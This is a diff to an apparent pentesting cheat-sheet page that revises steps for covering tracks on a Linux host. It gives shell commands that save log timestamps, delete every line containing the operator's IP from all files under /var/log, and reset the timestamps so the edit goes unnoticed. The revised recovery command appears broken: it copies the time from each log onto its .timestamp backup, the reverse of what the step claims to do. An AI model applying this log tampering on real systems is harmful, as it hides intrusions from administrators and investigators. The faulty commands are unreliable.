@@ -580,11 +580,13 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
  	<ol>
 		<li>Check log file coplies (for example <code>ls -la /var/log/*.gz /var/log/*.1 /var/log/*.old</code>)</li>
 		<li>Save/check timestamps</li>
-			<pre><code>stat /var/log/* > /tmp/log_timestamps.txt</code></pre>
+			<pre><code>find /var/log -type f -exec touch -r {} {}.timestamp \;</code></pre>
+			<!--<pre><code>stat /var/log/* > /tmp/log_timestamps.txt</code></pre>-->
  		<li>Delete</li>
 			<pre><code>find /var/log -type f -exec sed -i '/YOUR_IP/d' {} \;</code></pre>
 		<li>Recover timestamps</li>
-			<pre><code>touch -r /var/log/auth.log.1 /var/log/auth.log</code></pre>
+			<pre><code>find /var/log -type f -name "*.timestamp" -exec sh -c 'touch -r "${0%.timestamp}" "$0"' {} \;</code></pre>
+			<!--<pre><code>touch -r /var/log/auth.log.1 /var/log/auth.log</code></pre>-->
 			<p>Or use this <a href='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/scripts/timestamps_recover.sh'>script</a> if save as in second stage</p>
 		<li>Check result</li>
 			<pre><code>grep 'YOUR_IP' /var/log/*</code></pre>
